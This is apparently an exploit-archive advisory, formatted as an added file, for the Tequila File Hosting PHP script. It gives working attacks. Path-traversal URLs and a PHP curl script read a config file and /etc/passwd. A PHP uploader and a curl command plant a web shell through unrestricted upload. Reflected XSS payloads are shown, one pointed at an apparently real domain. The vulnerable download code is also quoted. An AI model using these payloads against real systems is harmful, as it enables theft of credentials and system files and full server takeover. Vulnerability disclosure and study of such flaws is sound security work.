@@ -1,0 +1,132 @@
+================================================================================
+Tequila File Hosting Arbitrary File Download
+================================================================================
+# Vendor Homepage: http://codecanyon.net/item/tequila-file-hosting-script/7604312
+# Date: 16/12/2015
+# Author: Ashiyane Digital Security Team
+# Version: 1.5
+# Contact: hehsan979@gmail.com
+# Source: http://ehsansec.ir/advisories/tequila-disclose.txt
+================================================================================
+# Description:
+Tequila is a solid, safe, fast, simple and intuitive script which
+allows companies or individuals to upload, manage and share their
+files online. It is studied in every feature and was produced with
+attention to every detail.
+
+# PoC :
+
+# Download Config
+http://localhost/tequila/download.php?download.php?filename=files/../include/php/constants.php&name=file.php
+
+# Download passwd
+http://localhost/tequila/download.php?filename=files/../../../../../etc/passwd&name=passwd
+
+
+# (PHP Exploit):
+
+	<?php
+	// page : download.php
+	echo "Tequila File Hosting Arbitrary File Download Exploiter\n";
+	echo "Discoverd By Ehsan Hosseini\n\n\n";
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL,
+"http://SERVER/download.php?filename=files/../include/php/constants.php&name=file.php");
+	curl_setopt($ch, CURLOPT_HTTPGET, 1);
+	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE
+5.01; Windows NT 5.0)");
+	$buf = curl_exec ($ch);
+	curl_close($ch);
+	unset($ch);
+	echo $buf;
+	?>
+
+# Vulnerabile code:
+
+	<?php
+	//This script forces the download of the file
+
+	//Retrieving the file name from the querystring
+	//and the stepping stone path to the download folder
+	$fn          = (isset($_GET['filename']) ? $_GET['filename'] : false);
+	$file        = $fn;
+	$sn          = (isset($_GET['name']) ? $_GET['name'] : false);
+	$secure_name = $sn;
+
+	if (strpos($file, "files/") !== false) {
+	    $checkdownload = "true";
+	} else {
+		$checkdownload = "false";
+	}
+
+	//I verify that the file exists
+	if($checkdownload == "true"){
+		if (!file_exists($file)) {
+			//If there is mold an error
+			echo "The file does not exist!";
+		} else {
+			//If the file exists ...
+			//Imposed on the header of the page to force the download of the file
+			header("Cache-Control: public");
+			header("Content-Description: File Transfer");
+			header('Content-Type: application/zip');
+			header("Content-Disposition: attachment; filename= " . $secure_name);
+			header("Content-Transfer-Encoding: binary");
+			header('Connection: Keep-Alive');
+			header('Expires: 0');
+			header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+			header('Pragma: public');
+			//I read the contents of the file
+			readfile($file);
+			exit;
+		}
+	}
+	?>
+
+#######################################################################
+
+================================================================================
+Tequila File Hosting Unrestricted File Upload
+================================================================================
+
+# PoC :
+First register in the site===>
+http://localhost/tequila/register.php
+
+Next using this exploit :
+
+    <?php
+    // page : upload.php
+    $postData = array('folder' => '/username', 'file' => '@shell.php');
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost/tequila/upload.php");
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData );
+    $buf = curl_exec ($ch);
+    curl_close($ch);
+    unset($ch);
+    echo $buf;
+    ?>
+
+or
+
+    curl -i -F folder='/ehsann' -F file=@ehsan.png
+http://localhost/tequila/upload.php
+
+Sheller uploaded.
+
+Path of shell : http://localhost/tequila/files/username/shell.php
+
+#######################################################################
+
+================================================================================
+Tequila File Hosting Coss Site Scripting
+================================================================================
+
+# PoC :
+http://localhost/files.php?folder="><script>alert('Ehsan')</script>
+http://easyhost.me/file.php?file="><script>alert('Ehsan')</script>
+
+================================================================================
+# Discovered By : Ehsan Hosseini (EhsanSec.ir)
+================================================================================
